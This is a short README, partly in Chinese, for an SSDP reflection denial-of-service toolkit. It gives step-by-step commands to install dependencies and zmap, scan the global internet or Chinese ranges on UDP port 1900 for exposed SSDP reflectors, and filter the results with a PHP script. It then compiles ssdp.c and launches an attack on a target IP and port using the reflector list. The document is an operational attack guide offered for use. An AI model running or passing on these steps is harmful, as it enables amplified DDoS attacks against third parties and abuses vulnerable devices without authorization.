# SSDP
```
yum -y install gcc+ gcc-c++
yum -y install gcc libcap libpcap libpcap-devel screen php dstat cmake gmp gmp-devel gengetopt byacc flex git json-c cpan vnstat zmap
yum install cmake gmp-devel gengetopt libpcap-devel flex byacc json-c-devel libunistring-devel
wget ftp://ftp.gnu.org/gnu/gengetopt/gengetopt-2.22.6.tar.gz
tar -zvxf gengetopt-2.22.6.tar.gz
cd gengetopt-2.22.6
./configure
make
make install
```
安装zmap<br>
```
yum install git
git clone https://github.com/zmap/zmap
cd zmap/
cmake .
make -j4
make install
```
安装完成！<br>
扫描全球：<br>
```screen zmap -M udp -p 1900 --probe-args=file:upnp_1900.pkt -o ssdp.txt```
扫描国内：<br>
```screen zmap -M udp -p 1900 -w cn.txt -B 100M --probe-args=file:upnp_1900.pkt -o ssdpscan.txt```
扫描完成后,我们开始执行过滤!<br>
过滤 ： <br>
```php ssdpfilter.php ssdp.txt ssdpfiltered.txt 200 1000```
200处理个数  1000线程<br>
全自动：screen ./scan 1<br>
自动过滤跟扫描，到时候表完成过后是ssdp.txt<br>
编译攻击脚本：<br>
```gcc -pthread ssdp.c -o ssdp```
SSDP攻击：<br>
```./ssdp <target IP> <target port> <reflection file>  <time (optional)>```
